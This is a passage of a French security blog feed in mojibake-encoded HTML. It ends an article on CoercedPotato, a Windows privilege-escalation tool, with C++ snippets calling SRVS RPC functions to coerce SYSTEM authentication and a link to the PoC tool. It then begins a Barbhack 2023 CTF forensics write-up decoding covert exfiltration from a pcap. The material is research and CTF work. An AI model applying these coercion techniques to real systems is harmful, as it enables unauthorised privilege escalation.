&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;callNetrFileGetInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wchar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_t&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetedNamedPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HRESULT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LPFILE&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_INFO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InfoStruct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fileId&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RpcTryExcept&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NetrFileGetInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;targetedNamedPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fileId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InfoStruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RpcExcept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXCEPTION&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_EXECUTE&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_HANDLER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RpcExceptionCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cerr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\[-\] An error has occurred during&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;NetrFileGetInfo() : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RpcEndExcept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous pourrions penser quâ€™il suffit de rÃ©pÃ©ter lâ€™exploit prÃ©cÃ©dent en
injectant notre payload dans &lt;strong&gt;ServerName&lt;/strong&gt;â€¦ Mais nonÂ ! La connexion sur
le named pipe est effectuÃ©e par lâ€™utilisateur qui a lancÃ© lâ€™outil, soit
nous-mÃªmes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image22.png&quot; style=&quot;width:5.94024in;height:1.84105in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, logiciel, Page web, IcÃ´ne dâ€™ordinateur Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Exploiter cette fonction en indiquant un emplacement sur le rÃ©seau
pourrait fonctionner pour provoquer une authentification sur le rÃ©seau,
dans la mesure oÃ¹ câ€™est le compte machine qui prendrait le relai et
effectuerait la connexion. &lt;strong&gt;Mais en local, câ€™est un Â« auto-pwn Â» !&lt;/strong&gt; Â â˜¹&lt;/p&gt;

&lt;p&gt;Pour finir lâ€™illustration de nos propos, continuons maintenant avec la
fonction &lt;strong&gt;NetrpGetFileSecurity()&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image23.png&quot; style=&quot;width:5.63841in;height:1.86533in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture dâ€™Ã©cran, Police, blanc Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Le code suivant a Ã©tÃ© utilisÃ©Â :&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;c1&quot;&gt;// shareName doit correspondre Ã  un partage rÃ©seau valide.&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;callNetrpGetFileSecurity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wchar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_t&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shareName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wchar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_t&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wchar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_t&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LocalAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_PATH&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WCHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StringCchPrintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wchar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_t&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpFileName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wchar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_t&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LocalAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_PATH&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WCHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StringCchPrintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;foo1234&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SECURITY&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_INFORMATION&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RequestedInformation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;OWNER&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_SECURITY&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_INFORMATION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GROUP&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_SECURITY&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_INFORMATION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;DACL&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_SECURITY&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_INFORMATION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PADT&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_SECURITY&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DESCRIPTOR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecurityDescriptor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
  
  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NetrpGetFileSecurity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shareName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpFileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;RequestedInformation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SecurityDescriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;NetrpGetFileSecurity returned %lx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Pour utiliser cette fonction, il est nÃ©cessaire dâ€™utiliser un partage
rÃ©seau valide. Une erreur est renvoyÃ©e le cas contraire. Une fois cette
condition remplie, il est effectivement possible de forcer lâ€™exÃ©cution
dâ€™une requÃªte par lâ€™utilisateur &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt;. Petit bÃ©molÂ :
le chemin indiquÃ© correspond Ã  un chemin de fichier absoluâ€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image24.png&quot; style=&quot;width:5.86999in;height:1.76867in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, logiciel, Page web, IcÃ´ne dâ€™ordinateur Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cette fonction ne peut donc pas Ãªtre utilisÃ©e pour Ã©lever nos privilÃ¨ges
en local.&lt;/p&gt;

&lt;p&gt;Pour rÃ©sumer, la recherche de fonctions vulnÃ©rables pour une Ã©lÃ©vation
de privilÃ¨ges en local requiert finalement plus de prÃ©requis que prÃ©vu.
Certaines interfaces RPC sont exploitables pour de la coercition
dâ€™authentification sur le rÃ©seau, mais pas en local. Pour autant, nous
continuons de chercher de nouvelles mÃ©thodes vulnÃ©rablesÂ !Â &lt;/p&gt;

&lt;p&gt;En revanche, les fonctions actuellement implÃ©mentÃ©es dans notre outil
nâ€™ont pas Ã©tÃ© patchÃ©es et ne seront certainement pas patchÃ©es, dans la
mesure oÃ¹ leurs comportements sont considÃ©rÃ©s comme Â«Â lÃ©gitimes Â» par
Microsoft.&lt;/p&gt;

&lt;p&gt;Vous retrouvez le code de lâ€™outil iciÂ :
&lt;a href=&quot;https://github.com/hackvens/CoercedPotato&quot;&gt;&lt;span&gt;https://github.com/hackvens/CoercedPotato&lt;/span&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Notre PoC a Ã©tÃ© testÃ© sur Windows 10, Windows Server 2016, Windows
Server 2022 et Windows 11 ! ğŸ¥³&lt;/p&gt;

&lt;p&gt;Et voilÃ , vous savez tout Ã  propos de CoercedPotatoÂ !&lt;/p&gt;

&lt;h1 id=&quot;remerciements&quot;&gt;&lt;strong&gt;Remerciements&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Nous souhaiterions remercier toutes celles et ceux qui nous ont apportÃ©
leurs aides durant nos recherches et plus particuliÃ¨rement :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;RÃ©mi GASCOU&lt;/strong&gt; (@Podalirius) pour ses travaux sur lâ€™utilisation
dâ€™appels RPC et la crÃ©ation de lâ€™outil Coercer.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;ClÃ©ment LABRO&lt;/strong&gt; (@itm4n) pour ses articles et recherches sur
Printspoofer et Petitpotam.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Guillaume DAUMAS&lt;/strong&gt; (@BlackWasp) pour ses relectures et conseils.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Advens&lt;/strong&gt; pour lâ€™organisation de la Hackvens ainsi que le temps
allouÃ© Ã  nos recherches.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ğŸ¥”&lt;/p&gt;

&lt;p&gt;Un article de &lt;em&gt;RaphaÃ«l HUON et ThÃ©o BERTRAND&lt;/em&gt;&lt;/p&gt;</content><author><name></name></author><category term="Articles" /><summary type="html">CoercedPotato - Une patate de plus ! ğŸ¥”</summary></entry><entry><title type="html">Discretfi</title><link href="http://localhost:4000/barbhack-2023/Discretfix.html" rel="alternate" type="text/html" title="Discretfi" /><published>2023-08-26T00:00:00+02:00</published><updated>2023-08-26T00:00:00+02:00</updated><id>http://localhost:4000/barbhack-2023/Discretfix</id><content type="html" xml:base="http://localhost:4000/barbhack-2023/Discretfix.html">&lt;h1 id=&quot;discretexfi&quot;&gt;Discretexfi&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;CatÃ©gorie :&lt;/strong&gt; Forensic&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/discretfi/enonce-discretexfi.png&quot; alt=&quot;enonce&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dans ce challenge nous rÃ©cupÃ©rons un fichier pcap comportant des paquets rÃ©seaux capturÃ© Ã  un instant donnÃ©. Nous observons dans un premier temps du traffic TCP en grande quantitÃ© :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/discretfi/wireshark-full.png&quot; alt=&quot;wireshark-full&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En filtrant sur les requÃªtes de type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; nous restreignons lâ€™affichage aux Ã©lÃ©ments qui nous intÃ©resses. Pour ce faire nous utilisons le filtre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http.request.method==&quot;GET&quot;&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/barbhack2023/discretfi/wireshark-filter.png&quot; alt=&quot;wireshark-filter&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nous notons la prÃ©sence de 3 URL diffÃ©rents :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/newfile?f=secret.txt&lt;/li&gt;
  &lt;li&gt;/bit&lt;/li&gt;
  &lt;li&gt;/lastbits&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Cependant nous ne retrouvons pas dâ€™Ã©lÃ©ment faisant rÃ©fÃ©rence au flag que nous cherchons. La seul diffÃ©rence notable est la version dâ€™HTTP utilisÃ© qui change Ã  chaque requÃªte. Nous isolons puis convertissons cette information avec la commande suivante :&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tshark &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; Discretexfi.pcap &lt;span class=&quot;nt&quot;&gt;-Y&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http.request.method == &quot;GET&quot;&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;{print $10}&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;.&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 2 | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;:a;N;$!ba;s/\n//g; s/ //g&apos;&lt;/span&gt; | perl &lt;span class=&quot;nt&quot;&gt;-lpe&lt;/span&gt; &lt;span 